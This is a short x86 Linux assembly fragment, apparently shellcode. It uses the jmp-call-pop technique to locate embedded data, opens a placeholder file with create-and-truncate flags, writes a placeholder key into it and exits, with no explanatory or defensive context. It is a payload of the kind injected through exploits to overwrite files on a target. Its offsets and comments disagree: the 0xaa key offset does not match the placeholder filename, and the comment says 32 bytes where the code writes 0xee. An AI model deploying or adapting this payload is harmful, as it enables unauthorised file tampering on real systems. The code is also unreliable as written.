# eax, ecx = temporary
# edx = fd


jmp data_path
thestart1:

popl %ebx           ## ebx = filepath
movl %ebx, %esi     
addl $0xaa, %esi    ## esi = key

xorl %ecx, %ecx
movw $0x241, %cx     ## flags
xorl %edx, %edx     ## mode
xorl %eax, %eax
movb $5, %al   
int $0x80

######## eax =open (filepath, 1, 0)
movl %eax, %ebx ## 1 - fd
movl %esi, %ecx ## 2 - buf
xorl %edx, %edx ## 3 - size
movb $0xee, %dl

movb $4, %al
int $0x80
######## write (edx, esi, 32)

movb $1, %al
int $0x80
######## exit()

data_path:
call thestart1
.ascii "FILENAME\0"
.ascii "KEY\0"

